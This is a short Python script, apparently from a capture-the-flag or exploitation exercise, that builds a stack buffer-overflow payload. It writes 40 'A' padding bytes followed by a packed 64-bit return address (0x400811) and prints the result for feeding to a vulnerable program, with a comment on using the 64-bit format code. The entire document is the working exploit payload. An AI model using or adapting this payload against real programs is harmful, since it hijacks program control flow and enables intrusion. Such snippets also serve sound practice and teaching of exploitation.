import struct
crap = "A" *40
eip = struct.pack("<Q",0x0000000000400811) # For 64 bit, we need the Q-C type rather than I

print(crap+eip)
